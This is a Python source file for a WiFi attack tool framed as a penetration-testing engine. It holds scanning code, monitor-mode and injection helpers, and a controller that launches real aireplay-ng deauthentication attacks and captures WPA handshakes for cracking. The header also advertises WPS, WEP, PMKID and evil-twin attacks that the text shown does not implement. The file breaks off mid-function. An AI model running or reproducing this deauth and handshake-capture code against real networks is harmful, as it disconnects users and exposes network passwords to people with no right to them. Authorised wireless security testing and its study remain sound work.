#!/usr/bin/env python3
"""
COMPREHENSIVE WIFI PENETRATION TESTING ENGINE
Includes all attack vectors: WPS, WPA, WEP, PMKID, Enterprise, Evil Twin,
and Default Credential Testing with enhanced error handling
"""
import os
import re
import time
import json
import shutil
import subprocess
import socket
import threading
import random
import glob
import hashlib
from typing import List, Dict, Optional, Tuple, Callable, Any, Union
from pathlib import Path
from enum import Enum, auto
from dataclasses import dataclass, field
import logging
from datetime import datetime
import sys

# Constants
DEFAULT_TIMEOUT = 60  # Default command timeout in seconds
MAX_DEAUTH_PACKETS = 10  # Maximum deauth packets to send
HANDSHAKE_CAPTURE_TIMEOUT = 120  # WPA handshake capture timeout
WPS_ATTACK_TIMEOUT = 180  # WPS PIN attack timeout
WEP_IV_GOAL = 15000  # IVs needed for WEP cracking
EVIL_TWIN_PORT = 8080  # Port for evil twin web server

class AttackType(Enum):
    """Types of wireless attacks supported by the tool"""
    ANY = auto()  # Generic error type
    WPS = auto()
    WPA = auto()
    WEP = auto()
    PMKID = auto()
    ENTERPRISE = auto()
    CLIENT = auto()
    DEFAULT_CREDS = auto()  # Check default credentials
    WEAK_PASSWORDS = auto()  # Test weak passwords
    DEAUTH = auto()  # Client deauthentication
    PORT_SCAN = auto()  # Scan for open ports
    IP_DETECT = auto()  # Network gateway IP detection
    EVIL_TWIN = auto()  # Evil Twin attack

@dataclass
class NetworkTarget:
    """Comprehensive model for a wireless network target"""
    bssid: str
    ssid: str
    channel: str
    security: List[str] = field(default_factory=list)
    clients: List[str] = field(default_factory=list)
    vendor: str = ""
    type: str = ""
    vulnerabilities: List[str] = field(default_factory=list)
    credentials: Dict = field(default_factory=dict)
    admin_access: bool = False
    gateway: str = ""
    signal_strength: int = 0
    authentication: str = ""
    encryption: str = ""
    wps_status: str = "Unknown"
    client_count: int = 0
    frequency: str = "2.4GHz"
    first_seen: float = 0
    last_seen: float = 0
    risk_score: int = 0  # 0-100 risk score
    
    @property
    def security_type(self) -> str:
        """Return the security type as a string for display and template use"""
        if not self.security:
            return "Open"
        
        # Determine security type based on the authentication and encryption values
        if "WPA2" in self.security or "WPA" in self.security:
            if "PSK" in self.authentication:
                return "WPA2-PSK" if "WPA2" in self.security else "WPA-PSK"
            elif "ENTERPRISE" in self.authentication:
                return "WPA2-Enterprise" if "WPA2" in self.security else "WPA-Enterprise"
            else:
                # Return the first security type if auth is unknown
                return self.security[0]
        elif "WEP" in self.security:
            return "WEP"
        else:
            # Join all security types if they don't match known patterns
            return "/".join(self.security) if self.security else "Unknown"

    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return {
            'bssid': self.bssid,
            'ssid': self.ssid,
            'channel': self.channel,
            'security': self.security,
            'security_type': self.security_type,
            'clients': self.clients,
            'vendor': self.vendor,
            'type': self.type,
            'vulnerabilities': self.vulnerabilities,
            'signal_strength': self.signal_strength,
            'authentication': self.authentication,
            'encryption': self.encryption,
            'wps_status': self.wps_status,
            'client_count': self.client_count,
            'frequency': self.frequency,
            'risk_score': self.risk_score
        }

@dataclass
class AttackParams:
    """Parameters for different attack methods"""
    wps_timeout: int = 120  # Timeout for WPS attack
    wpa_timeout: int = 30   # Timeout for WPA handshake capture
    wep_timeout: int = 120  # Timeout for WEP IV collection
    pmkid_timeout: int = 60  # Timeout for PMKID attack
    enterprise_timeout: int = 180  # Timeout for enterprise attacks
    deauth_packets: int = 5  # Number of deauth packets to send
    wps_pin_attempts: int = 5  # Number of WPS PIN attempts
    wep_iv_goal: int = 15000  # IVs needed for WEP cracking
    channel_hop_interval: int = 3  # Channel hopping interval
    
    # Wordlist paths
    default_creds_wordlist: str = "wordlists/default_creds.txt"
    wpa_wordlist: str = "wordlists/rockyou_sample.txt"
    wps_pin_wordlist: str = "wordlists/wps_pins.txt"
    
    # Evil Twin attack parameters
    evil_twin_template_type: str = "generic"
    use_custom_template: bool = False
    evil_twin_template_path: str = ""
    
    def to_dict(self) -> Dict:
        """Convert to dictionary for serialization"""
        return {
            'wps_timeout': self.wps_timeout,
            'wpa_timeout': self.wpa_timeout,
            'wep_timeout': self.wep_timeout,
            'pmkid_timeout': self.pmkid_timeout,
            'enterprise_timeout': self.enterprise_timeout,
            'deauth_packets': self.deauth_packets,
            'wps_pin_attempts': self.wps_pin_attempts,
            'wep_iv_goal': self.wep_iv_goal,
            'channel_hop_interval': self.channel_hop_interval,
            'default_creds_wordlist': self.default_creds_wordlist,
            'wpa_wordlist': self.wpa_wordlist,
            'wps_pin_wordlist': self.wps_pin_wordlist,
            'evil_twin_template_type': self.evil_twin_template_type,
            'use_custom_template': self.use_custom_template,
            'evil_twin_template_path': self.evil_twin_template_path
        }

class PentestError(Exception):
    """Base class for all pentesting exceptions"""
    def __init__(self, attack_type: AttackType, message: str):
        self.attack_type = attack_type
        self.message = message
        super().__init__(f"{attack_type.name} failed: {message}")

class SecurityUtils:
    """Advanced security utilities with robust error handling"""

    @staticmethod
    def run_command(cmd: List[str], timeout: int = DEFAULT_TIMEOUT, 
                  log_callback: Callable = None, log_output: bool = True) -> Tuple[bool, str, str]:
        """Secure command execution with comprehensive timeout handling"""
        try:
            proc = subprocess.Popen(cmd,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True)
            stdout, stderr = proc.communicate(timeout=timeout)
            success = proc.returncode == 0
            
            # Only log if a callback is provided and logging is enabled
            if log_callback and log_output:
                if success:
                    log_callback(f"Command executed successfully")
                else:
                    log_callback(f"Command failed with error: {stderr}", error=True)
            
            return (success, stdout, stderr)
        except subprocess.TimeoutExpired:
            if log_callback:
                log_callback(f"Command timed out after {timeout} seconds", error=True)
            proc.kill()
            return (False, "", "Command timed out")
        except Exception as e:
            if log_callback:
                log_callback(f"Command execution error: {str(e)}", error=True)
            return (False, "", str(e))

    @staticmethod
    def validate_interface(interface: str) -> bool:
        """Check if interface exists and is wireless"""
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, simulate interfaces
                return True if interface.startswith(('wlan', 'mon', 'eth')) else False
                
            # Check interface existence
            if not os.path.exists(f"/sys/class/net/{interface}"):
                return False
            
            # Check if wireless capable
            result = subprocess.run(["iw", "dev", interface, "info"],
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   text=True)
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def get_interface_mode(interface: str) -> str:
        """Get current operational mode"""
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, simulate interface modes
                if interface.startswith('mon'):
                    return "monitor"
                return "managed" if interface.startswith(('wlan', 'eth')) else "unknown"
                
            result = subprocess.run(["iw", "dev", interface, "info"],
                                   capture_output=True,
                                   text=True)
            match = re.search(r"type (\w+)", result.stdout)
            return match.group(1).lower() if match else "unknown"
        except Exception:
            return "nonexistent"

    @staticmethod
    def list_wireless_interfaces() -> List[str]:
        """Get all available wireless interfaces"""
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, return simulated interfaces
                return ["wlan0", "wlan1"]
                
            result = subprocess.run(["iw", "dev"],
                                   capture_output=True,
                                   text=True)
            return re.findall(r"Interface (\w+)", result.stdout)
        except Exception:
            # Try with 'iwconfig' as fallback
            try:
                result = subprocess.run(["iwconfig"],
                                      capture_output=True,
                                      text=True)
                return [line.split()[0] for line in result.stdout.splitlines() 
                        if "IEEE 802.11" in line]
            except Exception:
                return []
                
    @staticmethod
    def test_packet_injection(interface: str, log_callback: Callable = None) -> Tuple[bool, str, int]:
        """Test packet injection capabilities of wireless interface"""
        if log_callback:
            log_callback(f"Testing packet injection on {interface}...")
            
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, simulate packet injection test
                time.sleep(2)  # Simulate test duration
                if interface.startswith(('wlan', 'mon')):
                    if log_callback:
                        log_callback(f"Packet injection test successful (simulated)")
                    return (True, "Injection is working! (simulated)", 100)
                else:
                    if log_callback:
                        log_callback(f"Packet injection test failed (simulated)", error=True)
                    return (False, "Interface doesn't support injection (simulated)", 0)
            
            # Create the real command for testing packet injection
            cmd = [
                "sudo", "aireplay-ng", 
                "--test", 
                interface
            ]
            
            # Execute the command
            success, output, error = SecurityUtils.run_command(cmd, timeout=45)
            
            # Process output for error conditions
            if not success:
                error_msg = "Packet injection test failed"
                if log_callback:
                    log_callback(f"PACKET INJECTION TEST: FAILED", error=True)
                return (False, error_msg, 0)
                
            # Determine injection capability from actual test output
            injection_rate = 0
            
            # Define success patterns to check for positive indications
            success_patterns = [
                "injection is working", 
                "injection successful", 
                "packets sent", 
                "sending packets", 
                "perm. arp requests"
            ]
            
            # Extract actual injection rate from aireplay-ng output
            rate_match = re.search(r"(\d+)% success", output)
            if rate_match:
                injection_rate = int(rate_match.group(1))
            else:
                # Try alternate pattern matching for older aireplay versions
                pkt_match = re.search(r"(\d+) packets.*(\d+).*received", output)
                if pkt_match and int(pkt_match.group(1)) > 0:
                    sent = int(pkt_match.group(1))
                    received = int(pkt_match.group(2))
                    if sent > 0:
                        injection_rate = int((received / sent) * 100)
            
            # For manual testing, if we detect any success pattern but no rate was found,
            # assume 100% success rate
            if (any(x in output.lower() for x in success_patterns) or 
                any(f"{interface} is on channel" in output)) and injection_rate == 0:
                injection_rate = 100
                
            # If we detected a success pattern or a positive injection rate, report success
            if any(x in output.lower() for x in success_patterns) or injection_rate > 0:
                # Adapter supports packet injection
                if log_callback:
                    log_callback(f"Packet injection test successful ({injection_rate}% success rate)")
                return (True, f"Injection is working! ({injection_rate}% success rate)", injection_rate)
            else:
                # No injection capability detected
                if log_callback:
                    log_callback(f"Packet injection test failed", error=True)
                return (False, "Interface doesn't support injection", 0)
                
        except Exception as e:
            if log_callback:
                log_callback(f"Error testing packet injection: {str(e)}", error=True)
            return (False, str(e), 0)

    @staticmethod
    def set_monitor_mode(interface: str, enable: bool = True, log_callback: Callable = None) -> Tuple[bool, str]:
        """
        Enable or disable monitor mode on wireless interface
        Returns (success, new_interface_name)
        """
        if log_callback:
            mode_str = "monitor" if enable else "managed"
            log_callback(f"Setting {interface} to {mode_str} mode...")
            
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, simulate mode switching
                time.sleep(1)  # Simulate operation duration
                current_mode = SecurityUtils.get_interface_mode(interface)
                
                if enable and current_mode == "monitor":
                    if log_callback:
                        log_callback(f"{interface} is already in monitor mode")
                    return True, interface
                    
                if not enable and current_mode == "managed":
                    if log_callback:
                        log_callback(f"{interface} is already in managed mode")
                    return True, interface
                
                # Simulate interface name change for monitor mode
                new_interface = f"{interface}mon" if enable and not interface.endswith("mon") else interface
                if not enable and interface.endswith("mon"):
                    new_interface = interface[:-3]  # Remove 'mon' suffix
                    
                if log_callback:
                    log_callback(f"Successfully set {interface} to {mode_str} mode as {new_interface} (simulated)")
                return True, new_interface
            
            # Get current mode
            current_mode = SecurityUtils.get_interface_mode(interface)
            
            # Check if already in desired mode
            if (enable and current_mode == "monitor") or (not enable and current_mode == "managed"):
                if log_callback:
                    log_callback(f"{interface} is already in {current_mode} mode")
                return True, interface
            
            # For real hardware, use airmon-ng which handles dependency conflicts
            if enable:
                # First check and kill conflicting processes
                subprocess.run(["sudo", "airmon-ng", "check", "kill"], 
                             stdout=subprocess.PIPE, 
                             stderr=subprocess.PIPE)
                             
                # Enable monitor mode
                cmd = ["sudo", "airmon-ng", "start", interface]
                success, stdout, stderr = SecurityUtils.run_command(cmd)
                
                if not success:
                    if log_callback:
                        log_callback(f"Failed to enable monitor mode: {stderr}", error=True)
                    return False, interface
                
                # Try to detect the new interface name
                # airmon-ng might rename to wlan0mon or create a new interface
                monitor_interfaces = SecurityUtils.list_wireless_interfaces()
                
                # Look for common monitor interface naming patterns
                monitor_name = interface
                for iface in monitor_interfaces:
                    if iface == f"{interface}mon" or iface == f"mon{interface[-1]}":
                        monitor_name = iface
                        break
                
                if log_callback:
                    log_callback(f"Successfully enabled monitor mode on {monitor_name}")
                return True, monitor_name
            else:
                # Disable monitor mode
                cmd = ["sudo", "airmon-ng", "stop", interface]
                success, stdout, stderr = SecurityUtils.run_command(cmd)
                
                if not success:
                    if log_callback:
                        log_callback(f"Failed to disable monitor mode: {stderr}", error=True)
                    return False, interface
                
                # Try to detect the new interface name
                # Typically it reverts to wlanX
                managed_interfaces = SecurityUtils.list_wireless_interfaces()
                managed_name = interface
                
                # If the interface name ends with "mon", try to find the original name
                if interface.endswith("mon"):
                    expected_name = interface[:-3]  # Remove "mon" suffix
                    if expected_name in managed_interfaces:
                        managed_name = expected_name
                
                if log_callback:
                    log_callback(f"Successfully disabled monitor mode, interface is now {managed_name}")
                return True, managed_name
        except Exception as e:
            if log_callback:
                log_callback(f"Error changing interface mode: {str(e)}", error=True)
            return False, interface

class NetworkScanner:
    """Wireless network scanning functionality"""
    
    def __init__(self, interface: str, log_callback: Callable = None):
        self.interface = interface
        self.log_callback = log_callback
        self.stop_event = threading.Event()
        self.networks = {}  # BSSID -> NetworkTarget
        self.clients = {}   # Station MAC -> BSSID
        self.is_scanning = False
        self.scan_thread = None
        
    def log(self, message: str, error: bool = False, phase: str = None):
        """Log messages via callback if provided"""
        if self.log_callback:
            self.log_callback(message, error=error, phase=phase)
    
    def start_scan(self, duration: int = 60, channel: str = None) -> bool:
        """Start asynchronous network scan"""
        if self.is_scanning:
            self.log("Scan already in progress", error=True)
            return False
            
        self.is_scanning = True
        self.stop_event.clear()
        
        # Start scanning in a separate thread
        self.scan_thread = threading.Thread(
            target=self._scan_networks,
            args=(duration, channel),
            daemon=True
        )
        self.scan_thread.start()
        return True
        
    def stop_scan(self) -> bool:
        """Stop ongoing scan"""
        if not self.is_scanning:
            return False
            
        self.stop_event.set()
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join(timeout=2)
        
        self.is_scanning = False
        return True
    
    def get_network_by_bssid(self, bssid: str) -> Optional[NetworkTarget]:
        """Get network by BSSID"""
        return self.networks.get(bssid.upper())
    
    def get_networks(self) -> List[NetworkTarget]:
        """Get list of all detected networks"""
        return list(self.networks.values())
    
    def get_clients(self) -> Dict[str, str]:
        """Get dictionary of all detected clients (MAC -> BSSID)"""
        return self.clients.copy()
    
    def _scan_networks(self, duration: int = 60, channel: str = None):
        """Internal scan method that runs in a separate thread"""
        self.log("Starting network scan...", phase="SCAN")
        
        try:
            # Check if we're in development mode
            if 'REPL_ID' in os.environ or 'REPLIT' in os.environ:
                # In development mode, simulate scanning
                self._simulate_network_scan(duration, channel)
            else:
                # Real scanning using airodump-ng
                self._perform_actual_scan(duration, channel)
        except Exception as e:
            self.log(f"Error during scan: {str(e)}", error=True)
        finally:
            self.is_scanning = False
            self.log("Scan completed", phase="SCAN")
    
    def _simulate_network_scan(self, duration: int, channel: str = None):
        """Simulate network scan for development environment"""
        self.log("DEVELOPMENT MODE: Simulating network scan", phase="SCAN")
        
        # Simulate networks
        simulated_networks = [
            {
                "bssid": "AA:BB:CC:11:22:33",
                "ssid": "Home-Router-5G",
                "channel": "6",
                "security": ["WPA2"],
                "signal_strength": 85,
                "vendor": "TP-Link",
                "clients": ["11:22:33:44:55:66"],
                "wps_status": "Enabled"
            },
            {
                "bssid": "BB:CC:DD:22:33:44",
                "ssid": "Office-Network",
                "channel": "11",
                "security": ["WPA2", "PSK"],
                "signal_strength": 72,
                "vendor": "Cisco",
                "clients": ["22:33:44:55:66:77", "33:44:55:66:77:88"],
                "wps_status": "Disabled"
            },
            {
                "bssid": "CC:DD:EE:33:44:55",
                "ssid": "Guest-WiFi",
                "channel": "1",
                "security": ["WPA"],
                "signal_strength": 60,
                "vendor": "D-Link",
                "clients": [],
                "wps_status": "Enabled"
            },
            {
                "bssid": "DD:EE:FF:44:55:66",
                "ssid": "IOT-Network",
                "channel": "1",
                "security": ["WEP"],
                "signal_strength": 55,
                "vendor": "Netgear",
                "clients": ["44:55:66:77:88:99"],
                "wps_status": "Unknown"
            },
            {
                "bssid": "EE:FF:00:55:66:77",
                "ssid": "PublicWiFi",
                "channel": "3",
                "security": [],
                "signal_strength": 40,
                "vendor": "Unknown",
                "clients": ["55:66:77:88:99:AA", "66:77:88:99:AA:BB", "77:88:99:AA:BB:CC"],
                "wps_status": "Unknown"
            }
        ]
        
        # Simulate discovery of networks over time
        total_networks = len(simulated_networks)
        scan_interval = min(5, duration / total_networks)
        
        for i in range(total_networks):
            if self.stop_event.is_set():
                break
                
            network_data = simulated_networks[i]
            
            # Create NetworkTarget object
            network = NetworkTarget(
                bssid=network_data["bssid"],
                ssid=network_data["ssid"],
                channel=network_data["channel"],
                security=network_data["security"],
                vendor=network_data["vendor"],
                signal_strength=network_data["signal_strength"],
                wps_status=network_data["wps_status"]
            )
            
            # Calculate risk score based on security
            if not network.security:
                network.risk_score = 100  # Open networks are highest risk
            elif "WEP" in network.security:
                network.risk_score = 85  # WEP is very insecure
            elif "WPA" in network.security and "WPA2" not in network.security:
                network.risk_score = 60  # WPA without WPA2 is moderate risk
            elif "WPA2" in network.security:
                network.risk_score = 30  # WPA2 is lower risk
                if network.wps_status == "Enabled":
                    network.risk_score += 20  # WPS adds risk
            
            # Add to networks dictionary
            self.networks[network.bssid] = network
            
            # Add clients
            for client_mac in network_data["clients"]:
                self.clients[client_mac] = network.bssid
            
            # Update client count
            network.client_count = len(network_data["clients"])
            
            # Log discovery
            self.log(f"Discovered network: {network.ssid} ({network.bssid}) on channel {network.channel}", phase="SCAN")
            
            # Simulate scanning time
            time.sleep(scan_interval)
            
            # Update progress periodically
            progress = (i + 1) / total_networks * 100
            self.log(f"Scan progress: {progress:.1f}%", phase="SCAN")
        
        # If not stopped, wait until full duration
        elapsed = total_networks * scan_interval
        if elapsed < duration and not self.stop_event.is_set():
            self.log(f"Continuing scan for {duration - elapsed:.1f} more seconds...", phase="SCAN")
            time.sleep(min(duration - elapsed, duration))
    
    def _perform_actual_scan(self, duration: int, channel: str = None):
        """Perform actual network scan using airodump-ng"""
        # Create temporary directory for scan results
        temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Generate unique filename prefix for this scan
        timestamp = int(time.time())
        output_prefix = os.path.join(temp_dir, f"scan_{timestamp}")
        
        # Prepare channel parameter
        channel_param = []
        if channel:
            channel_param = ["--channel", channel]
        
        # Build airodump-ng command
        cmd = [
            "sudo", "airodump-ng",
            "--write", output_prefix,
            "--output-format", "csv",
            *channel_param,
            self.interface
        ]
        
        # Start airodump-ng process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for scan duration
        start_time = time.time()
        try:
            while time.time() - start_time < duration and not self.stop_event.is_set():
                # Check if airodump-ng is still running
                if process.poll() is not None:
                    self.log("Scan process terminated unexpectedly", error=True)
                    break
                    
                # Update progress
                elapsed = time.time() - start_time
                progress = min(100, (elapsed / duration) * 100)
                self.log(f"Scan progress: {progress:.1f}%", phase="SCAN")
                
                # Parse interim results
                self._parse_airodump_csv(f"{output_prefix}-01.csv")
                
                # Wait a bit before checking again
                time.sleep(3)
        finally:
            # Terminate airodump-ng gracefully
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
            
            # Final parse of results
            self._parse_airodump_csv(f"{output_prefix}-01.csv")
    
    def _parse_airodump_csv(self, csv_file: str):
        """Parse airodump-ng CSV output file"""
        if not os.path.exists(csv_file):
            return
            
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='replace') as f:
                csv_content = f.read()
                
            # Split content into AP and client sections
            sections = csv_content.split("\r\n\r\n")
            if len(sections) < 2:
                return
                
            ap_section = sections[0]
            client_section = sections[1]
            
            # Parse APs
            ap_lines = ap_section.strip().split("\r\n")
            if len(ap_lines) < 2:
                return
                
            # Get AP header
            ap_header = ap_lines[0].strip().split(',')
            ap_header = [h.strip() for h in ap_header]
            
            # Find column indices
            bssid_idx = ap_header.index('BSSID')
            first_time_idx = ap_header.index('First time seen')
            last_time_idx = ap_header.index('Last time seen')
            channel_idx = ap_header.index('channel')
            speed_idx = ap_header.index('Speed')
            privacy_idx = ap_header.index('Privacy')
            cipher_idx = ap_header.index('Cipher')
            auth_idx = ap_header.index('Authentication')
            power_idx = ap_header.index('Power')
            essid_idx = ap_header.index('ESSID')
            
            # Parse AP data
            for i in range(1, len(ap_lines)):
                line = ap_lines[i].strip()
                if not line:
                    continue
                    
                ap_data = line.split(',')
                ap_data = [d.strip() for d in ap_data]
                
                if len(ap_data) <= essid_idx:
                    continue
                    
                bssid = ap_data[bssid_idx].upper()
                ssid = ap_data[essid_idx].strip('"')
                
                if not bssid or bssid == "(not associated)" or not ssid or ssid == "<length:":
                    continue
                    
                # Get or create network target
                if bssid in self.networks:
                    network = self.networks[bssid]
                else:
                    network = NetworkTarget(
                        bssid=bssid,
                        ssid=ssid,
                        channel=ap_data[channel_idx]
                    )
                    self.networks[bssid] = network
                    self.log(f"Discovered network: {ssid} ({bssid})", phase="SCAN")
                
                # Update network info
                network.channel = ap_data[channel_idx]
                
                # Update security info
                privacy = ap_data[privacy_idx]
                if privacy.startswith("WEP"):
                    network.security = ["WEP"]
                elif privacy.startswith("WPA"):
                    network.security = []
                    if "WPA" in privacy:
                        network.security.append("WPA")
                    if "WPA2" in privacy:
                        network.security.append("WPA2")
                elif privacy == "OPN":
                    network.security = []
                    
                # Update authentication and encryption
                if len(ap_data) > auth_idx:
                    network.authentication = ap_data[auth_idx]
                if len(ap_data) > cipher_idx:
                    network.encryption = ap_data[cipher_idx]
                
                # Update signal strength (power)
                try:
                    power = int(ap_data[power_idx])
                    # Convert from dBm to percentage (rough approximation)
                    # -50 dBm or higher is excellent (100%)
                    # -100 dBm or lower is very poor (0%)
                    if power < 0:
                        power = -power
                    network.signal_strength = max(0, min(100, int((100 - (power - 50)) * 2)))
                except (ValueError, IndexError):
                    pass
                
                # Update time seen
                try:
                    if len(ap_data) > first_time_idx:
                        first_time_str = ap_data[first_time_idx]
                        network.first_seen = time.time()
                    if len(ap_data) > last_time_idx:
                        last_time_str = ap_data[last_time_idx]
                        network.last_seen = time.time()
                except (ValueError, IndexError):
                    pass
            
            # Parse clients
            client_lines = client_section.strip().split("\r\n")
            if len(client_lines) < 2:
                return
                
            # Get client header
            client_header = client_lines[0].strip().split(',')
            client_header = [h.strip() for h in client_header]
            
            # Find column indices
            station_idx = client_header.index('Station MAC')
            try:
                network_idx = client_header.index('BSSID')
            except ValueError:
                network_idx = client_header.index('AP')
            power_idx = client_header.index('Power')
            
            # Parse client data
            for i in range(1, len(client_lines)):
                line = client_lines[i].strip()
                if not line:
                    continue
                    
                client_data = line.split(',')
                client_data = [d.strip() for d in client_data]
                
                if len(client_data) <= network_idx:
                    continue
                    
                client_mac = client_data[station_idx].upper()
                bssid = client_data[network_idx].upper()
                
                if not client_mac or not bssid or bssid == "(not associated)":
                    continue
                    
                # Add to clients dictionary
                self.clients[client_mac] = bssid
                
                # Add to network's client list
                if bssid in self.networks:
                    network = self.networks[bssid]
                    if client_mac not in network.clients:
                        network.clients.append(client_mac)
                        network.client_count = len(network.clients)
        except Exception as e:
            self.log(f"Error parsing scan results: {str(e)}", error=True)

class PentestController:
    """Main controller for penetration testing operations"""
    
    def __init__(self, callback: Callable = None):
        self.callback = callback
        self.interface = None
        self.monitor_interface = None
        self.scanner = None
        self.attack_params = AttackParams()
        self.running = False
        self.stop_event = threading.Event()
        self.dev_mode = 'REPL_ID' in os.environ or 'REPLIT' in os.environ
        
    def log(self, message: str, error: bool = False, success: bool = False, phase: str = None):
        """Log messages via callback if provided"""
        if self.callback:
            self.callback(message, error=error, success=success, phase=phase)
    
    def set_interface(self, interface: str) -> bool:
        """Set wireless interface to use"""
        if not SecurityUtils.validate_interface(interface):
            self.log(f"Invalid interface: {interface}", error=True)
            return False
            
        self.interface = interface
        self.log(f"Interface set to {interface}")
        return True
    
    def start_scan(self, duration: int = 60, channel: str = None) -> bool:
        """Start network scan"""
        if not self.interface:
            self.log("No interface selected", error=True)
            return False
            
        # Enable monitor mode if needed
        current_mode = SecurityUtils.get_interface_mode(self.interface)
        if current_mode != "monitor":
            self.log("Enabling monitor mode...")
            success, monitor_interface = SecurityUtils.set_monitor_mode(self.interface, True, self.log)
            if not success:
                self.log("Failed to enable monitor mode", error=True)
                return False
            self.monitor_interface = monitor_interface
        else:
            self.monitor_interface = self.interface
            
        # Create scanner if needed
        if not self.scanner:
            self.scanner = NetworkScanner(self.monitor_interface, self.log)
            
        # Start scan
        return self.scanner.start_scan(duration, channel)
    
    def stop_scan(self) -> bool:
        """Stop ongoing network scan"""
        if not self.scanner:
            return False
            
        return self.scanner.stop_scan()
    
    def test_injection(self) -> Tuple[bool, str, int]:
        """Test packet injection capability"""
        if not self.interface:
            self.log("No interface selected", error=True)
            return False, "No interface selected", 0
            
        # Enable monitor mode if needed
        current_mode = SecurityUtils.get_interface_mode(self.interface)
        if current_mode != "monitor":
            self.log("Enabling monitor mode for injection test...")
            success, monitor_interface = SecurityUtils.set_monitor_mode(self.interface, True, self.log)
            if not success:
                self.log("Failed to enable monitor mode", error=True)
                return False, "Failed to enable monitor mode", 0
            self.monitor_interface = monitor_interface
        else:
            self.monitor_interface = self.interface
            
        # Test injection
        return SecurityUtils.test_packet_injection(self.monitor_interface, self.log)
    
    def get_networks(self) -> List[NetworkTarget]:
        """Get list of detected networks"""
        if not self.scanner:
            return []
            
        return self.scanner.get_networks()
    
    def get_network_by_bssid(self, bssid: str) -> Optional[NetworkTarget]:
        """Get network by BSSID"""
        if not self.scanner:
            return None
            
        return self.scanner.get_network_by_bssid(bssid)
    
    def perform_deauth_attack(self, bssid: str, client_mac: str = None, count: int = 5) -> bool:
        """
        Perform deauthentication attack
        If client_mac is None, broadcast deauth is used
        """
        if not self.monitor_interface:
            self.log("No monitor interface available", error=True)
            return False
            
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False
            
        self.log(f"Performing deauthentication attack on {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate deauth attack
            self.log(f"DEVELOPMENT MODE: Simulating deauth attack on {bssid}", phase="ATTACK")
            time.sleep(2)  # Simulate attack duration
            
            target_desc = f"broadcast" if not client_mac else f"client {client_mac}"
            self.log(f"Sent {count} deauthentication packets to {target_desc} (simulated)", phase="ATTACK")
            return True
        
        # Build aireplay-ng command
        cmd = [
            "sudo", "aireplay-ng",
            "--deauth", str(count),
            "-a", bssid
        ]
        
        # Add client MAC if specified
        if client_mac:
            cmd.extend(["-c", client_mac])
            
        cmd.append(self.monitor_interface)
        
        # Execute command
        success, output, error = SecurityUtils.run_command(cmd, timeout=30)
        
        if success:
            target_desc = f"broadcast" if not client_mac else f"client {client_mac}"
            self.log(f"Sent {count} deauthentication packets to {target_desc}", phase="ATTACK")
        else:
            self.log(f"Deauthentication attack failed: {error}", error=True, phase="ATTACK")
            
        return success
    
    def capture_wpa_handshake(self, bssid: str, channel: str, timeout: int = 60) -> Tuple[bool, str]:
        """
        Capture WPA handshake
        Returns (success, capture_file_path)
        """
        if not self.monitor_interface:
            self.log("No monitor interface available", error=True)
            return False, ""
            
        network = self.get_network_by_bssid(bssid)
        if not network:
            self.log(f"Network {bssid} not found", error=True)
            return False, ""
            
        self.log(f"Attempting to capture WPA handshake for {network.ssid} ({bssid})...", phase="ATTACK")
        
        # Check if we're in development mode
        if self.dev_mode:
            # Simulate handshake capture
            self.log(f"DEVELOPMENT MODE: Simulating WPA handshake capture for {bssid}", phase="ATTACK")
            
            # Simulate deauth
            self.log(f"Sending deauthentication packets to force handshake... (simulated)", phase="ATTACK")
            time.sleep(2)  # Simulate deauth duration
            
            # Simulate capture
            self.log(f"Listening for handshake... (simulated)", phase="ATTACK")
            time.sleep(3)  # Simulate capture duration
            
            # Simulate success
            capture_file = f"handshake_{bssid.replace(':', '')}.cap"
            self.log(f"WPA handshake captured successfully! (simulated)", success=True, phase="ATTACK")
            return True, capture_file
        
        # Create temporary directory for capture file
        temp_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp")
        os.makedirs(temp_dir, exist_ok=True)
        
        # Generate unique filename for this capture
        timestamp = int(time.time())
        output_prefix = os.path.join(temp_dir, f"handshake_{timestamp}")
        
        # Start airodump-ng to capture handshake
        dump_cmd = [
            "sudo", "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", output_prefix,
            "--output-format", "pcap,csv",
            self.monitor_interface
        ]
        
        dump_process = subprocess.Popen(
            dump_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for airodump-ng to initialize
        time.sleep(3)
        
        # Send deauth packets to force handshake
        self.log(f"Sending deauthentication packets to force handshake...", phase="ATTACK")
        
        # Perform multiple deauths with short pauses
        for i in range(3):
            self.perform_deauth_attack(bssid, count=2)
            time.sleep(2)
        
        # Wait and check for handshake
        start_time = time.time()
        handshake_captured = False
        capture_file = f"{output_prefix}-01.cap"
        
        try:
            while time.time() - start_time < timeout and not handshake_captured:
                # Check if handshake is captured
                if os.path.exists(capture_file):
                    check_cmd = ["sudo", "aircrack-ng", "-a", "2", "-b", bssid, capture_file]
                    success, output, error = SecurityUtils.run_command(check_cmd, log_output=False)
                    
                    if success and "handshake" in output.lower() and "WPA" in output and not "0 handshake" in output:
                        handshake_captured = True
                        break
                
                # No handshake yet, try another deauth if clients are connected
                if time.time() - start_time > 15 and not handshake_captured:
